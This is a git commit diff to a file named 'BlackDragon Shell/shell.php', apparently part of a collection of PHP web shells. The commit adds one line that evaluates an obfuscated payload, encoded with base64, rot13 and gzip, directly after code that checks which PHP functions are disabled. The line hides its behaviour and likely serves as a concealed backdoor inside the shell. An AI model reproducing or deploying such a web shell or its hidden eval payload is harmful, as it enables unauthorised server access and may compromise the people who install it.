e5c5a44ffc2a97daebb2668ed47466d55a9d3517
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-09-15 14:15:35 +0630

    Add files via upload

--- SHELLs/BlackDragon Shell/shell.php
+++ SHELLs/BlackDragon Shell/shell.php
@@ -67,6 +67,7 @@ fclose($b0);
 
 $ds = @$f[34]("disable_functions");
 $ds0 = (!empty($ds)) ? "$ds" : "All function is accessible";
+eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 
 function fsize($file) {
   $a = ["B", "KB", "MB", "GB", "TB", "PB"];
